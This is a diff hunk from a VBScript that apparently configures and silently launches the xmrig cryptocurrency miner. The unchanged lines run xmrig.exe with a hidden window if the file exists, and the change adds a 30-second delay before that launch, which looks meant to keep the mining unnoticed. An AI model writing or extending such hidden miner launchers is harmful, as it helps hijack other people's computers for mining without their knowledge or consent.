@@ -51,6 +51,9 @@ Set objFile = objFSO.OpenTextFile(jsonFilePath, 2, False)
 objFile.Write updatedContent
 objFile.Close
 
+' Wait for 30 seconds
+WScript.Sleep 30000
+
 ' Launch xmrig.exe silently if it exists
 If objFSO.FileExists(xmrigPath) Then
     objShell.Run """" & xmrigPath & """", 0, False
